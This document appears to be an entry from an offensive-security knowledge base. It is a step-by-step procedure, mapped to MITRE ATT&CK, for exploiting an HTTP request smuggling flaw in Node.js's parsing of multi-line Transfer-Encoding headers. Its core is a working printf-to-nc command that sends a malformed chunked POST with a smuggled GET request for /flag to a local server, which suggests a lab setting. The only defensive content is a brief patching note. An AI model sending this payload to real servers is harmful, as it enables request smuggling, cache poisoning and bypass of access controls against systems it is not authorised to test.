---
tags:
  - http-request-smuggling
  - payload-crafting
type: procedure
tools:
  - '[[tools/printf]]'
  - '[[tools/nc]]'
tactics:
  - '[[Execution]]'
commands:
  - '[[commands/printf-nc-send-payload]]'
platforms:
  - Node.js
  - Web
techniques:
  - '[[Exploit Public-Facing Application]]'
skill_level: intermediate
impact_level: high
detection_risk: medium
sub_techniques: []
id: b54f297a-a80b-4cae-8bcc-c3e70bbd85d8
created_at: '2025-12-13T09:01:17.192Z'
updated_at: '2025-12-13T09:01:17.192Z'
verified: false
validated: true
submitted: true
mitre_tactics:
  - '[[Execution]]'
mitre_techniques:
  - '[[Exploit Public-Facing Application]]'
---
# Send Crafted Smuggling Payload

## Summary

This procedure constructs and sends a crafted HTTP payload to exploit the HTTP Request Smuggling vulnerability in Node.js by using multi-line Transfer-Encoding headers.

## Description

The payload includes a POST request with malformed headers followed by chunked data and a smuggled GET request. It uses printf to format the request and nc to transmit it to the server, demonstrating how the parser incorrectly splits the request.

## Requirements

1. Running Node.js HTTP server on localhost:80
2. Access to shell commands like printf and nc
3. Knowledge of HTTP request structure

## Defense

Defensive measures and detection strategies:

- Update to Node.js versions with complete fixes for multi-line header parsing
- Implement strict request validation in web applications

## Objectives

1. Exploit the parsing flaw to smuggle requests
2. Demonstrate request splitting
3. Test for potential impacts like cache poisoning

## Instructions

### Step 1: Construct and Send Payload

**Context**: Builds the malformed HTTP request and sends it to the server.

**Command** ([[commands/printf-nc-send-payload]]):

```bash
printf "POST / HTTP/1.1\r\nHost: 127.0.0.1\r\nTransfer-Encoding: chunked\r\n , chunked-false\r\n\r\n1\r\nA\r\n0\r\n\r\nGET /flag HTTP/1.1\r\nHost: 127.0.0.1\r\nfoo: x\r\n\r\n\r\n" | nc localhost 80
```

> This command formats the smuggling payload with printf and pipes it to nc for transmission to localhost on port 80.

## MITRE ATT&CK Mapping

### Tactics

- [[Execution]]

### Techniques

- [[Exploit Public-Facing Application]]

### Sub-Techniques



## Commands Used

- [[commands/printf-nc-send-payload]]

## Tools Used

- [[tools/printf]]
- [[tools/nc]]

## Tags

- [[http-request-smuggling]]
- [[payload-crafting]]
